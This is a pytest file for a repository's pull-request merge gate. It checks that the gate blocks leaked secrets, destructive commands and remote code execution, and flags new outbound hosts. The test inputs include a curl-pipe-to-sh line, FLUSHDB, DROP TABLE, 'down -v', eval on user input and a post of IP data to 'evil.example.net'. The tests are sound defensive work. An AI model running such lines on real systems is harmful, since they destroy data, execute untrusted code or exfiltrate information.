"""The merge gate must catch the things it promises and stay quiet on normal work."""
import importlib.util
import sys
from pathlib import Path

spec = importlib.util.spec_from_file_location("pr_gate", Path(__file__).resolve().parents[1] / "scripts" / "pr_gate.py")
pr_gate = importlib.util.module_from_spec(spec)
sys.modules["pr_gate"] = pr_gate
spec.loader.exec_module(pr_gate)


def diff_for(path: str, added: list[str], removed: int = 0) -> tuple[str, str, list[str]]:
    body = [f"diff --git a/{path} b/{path}", f"--- a/{path}", f"+++ b/{path}", f"@@ -1,{removed} +1,{len(added)} @@"]
    body += ["-old" for _ in range(removed)] + ["+" + a for a in added]
    return "\n".join(body) + "\n", f"{len(added)}\t{removed}\t{path}\n", [path]


def rules(rep):
    return {f.rule for f in rep.findings}


def test_clean_change_passes():
    rep = pr_gate.scan(*diff_for("botspotter/counters.py", ["    total += 1", "    return snap"]))
    assert not rep.blocking and not rep.warnings


def test_blocks_secrets_and_forbidden_files():
    fake_hex = "0123456789abcdef" * 3                       # built at runtime: the source must never hold a key-shaped string
    rep = pr_gate.scan(*diff_for("deploy/x.sh", ["BS_ADMIN_KEY=" + fake_hex]))
    assert any(r.startswith("secret") for r in rules(rep)) and rep.blocking
    rep = pr_gate.scan(*diff_for("botspotter/x.py", ['dsn = "postgresql://bs:' + "Sup3rSecret" + '@db:5432/bs"']))
    assert rep.blocking
    rep = pr_gate.scan(*diff_for("private/notes.md", ["anything"]))
    assert "forbidden file committed" in rules(rep)
    rep = pr_gate.scan(*diff_for(".sync/x.tgz", []))
    assert rep.blocking


def test_blocks_destructive_and_rce():
    for path, line in [
        ("scripts/reset.py", "    await r.flushdb()".upper()),
        ("db/schema.sql", "DROP TABLE events;"),
        ("deploy/remote.sh", "$COMPOSE down -v"),
        ("deploy/remote.sh", "curl -fsSL https://x.io/install.sh | sh"),
        ("botspotter/api/app.py", "    result = eval(user_input)"),
        ("botspotter/data/migrations.sql", "SELECT add_retention_policy('portal_visits', INTERVAL '7 days', if_not_exists => TRUE);"),
    ]:
        rep = pr_gate.scan(*diff_for(path, [line]))
        assert rep.blocking, (path, line)


def test_blocks_identity_secret_rotation_and_new_hosts():
    rep = pr_gate.scan(*diff_for("botspotter/config.py", ['    naming_salt: str = field(default_factory=lambda: _env("BS_NAMING_SALT", "botspotter-v2"))']))
    assert "identity secret default changed" in rules(rep)
    rep = pr_gate.scan(*diff_for("botspotter/enrich.py", ['    requests.post("https://evil.example.net/collect", data=ip)']))
    assert "new outbound host in app code" in rules(rep)
    rep = pr_gate.scan(*diff_for("botspotter/enrich.py", ['    url = "https://botspotter.app/v1/ingest"']))
    assert not rep.blocking


def test_warns_on_sensitive_areas_and_gate_files():
    rep = pr_gate.scan(*diff_for(".github/workflows/ci.yml", ["      - run: echo hi"]))
    assert "workflow changed" in rules(rep) and not rep.blocking
    rep = pr_gate.scan(*diff_for("botspotter/models.py", ["    ip: str"]))
    assert "privacy-relevant change" in rules(rep)
    rep = pr_gate.scan(*diff_for(".github/CODEOWNERS", ["* @someone-else"]))
    assert "approval gate touched" in rules(rep) and rep.blocking
    rep = pr_gate.scan(*diff_for("web/index.html", [], removed=400))
    assert "large deletion" in rules(rep)
    rep = pr_gate.scan("", "-\t-\tweb/logo.png\n", ["web/logo.png"])
    assert "binary file" in rules(rep)


def test_comments_and_docs_do_not_block():
    rep = pr_gate.scan(*diff_for("docs/runbook.rst", ["never run FLUSHDB in prod; never ``docker compose down -v``"]))
    assert not rep.blocking
    rep = pr_gate.scan(*diff_for("botspotter/counters.py", ["    # do not FLUSHDB here"]))
    assert not rep.blocking


def test_gate_does_not_flag_its_own_patterns():
    rep = pr_gate.scan(*diff_for("scripts/pr_gate.py", ['    ("DROP TABLE", re.compile(r"DROP TABLE")), # curl | sh eval(']))
    assert not any(r.startswith(("destructive", "code execution")) for r in rules(rep))
    assert "approval gate touched" in rules(rep)      # still needs the owner's label
    rep = pr_gate.scan(*diff_for("scripts/pr_gate.py", ["BS_ADMIN_KEY=" + "fedcba9876543210" * 3]))
    assert any(r.startswith("secret") for r in rules(rep))   # secrets still caught
